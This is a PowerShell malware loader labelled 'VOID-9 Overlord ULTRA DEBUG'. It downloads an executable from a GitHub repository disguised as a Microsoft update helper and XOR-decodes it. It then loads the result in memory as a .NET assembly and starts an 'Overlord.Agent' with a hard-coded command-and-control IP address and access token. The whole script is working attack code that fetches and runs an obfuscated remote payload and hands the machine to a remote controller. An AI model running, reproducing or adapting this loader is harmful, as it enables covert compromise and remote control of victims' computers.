# VOID-9 Overlord ULTRA DEBUG 2026
Write-Host "=== VOID-9 ULTRA DEBUG START ===" -ForegroundColor Green

try {
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    Write-Host "Trying to download from: $url" -ForegroundColor Yellow

    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $data = $wc.DownloadData($url)

    Write-Host "Successfully downloaded $($data.Length) bytes" -ForegroundColor Green

    if ($data.Length -lt 100000) {
        Write-Host "ERROR: File too small! Probably failed download" -ForegroundColor Red
        exit
    }

    # Decrypt
    for($i=0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0x69 }
    Write-Host "Decryption done" -ForegroundColor Green

    # Load
    $asm = [System.Reflection.Assembly]::Load($data)
    Write-Host "Assembly loaded successfully" -ForegroundColor Green

    $type = $asm.GetType("Overlord.Agent")
    $method = $type.GetMethod("Run", [Reflection.BindingFlags]"Public,Static")

    $c2 = "http://176.65.132.236:5173"
    $token = "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ"

    Write-Host "Calling Run($c2, token...)" -ForegroundColor Cyan
    $method.Invoke($null, @($c2, $token))

    Write-Host "=== AGENT SHOULD BE CONNECTING NOW ===" -ForegroundColor Green
}
catch {
    Write-Host "CRITICAL ERROR:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.Exception.InnerException -ForegroundColor Red
}

Write-Host "=== VOID-9 ULTRA DEBUG END ===" -ForegroundColor Green
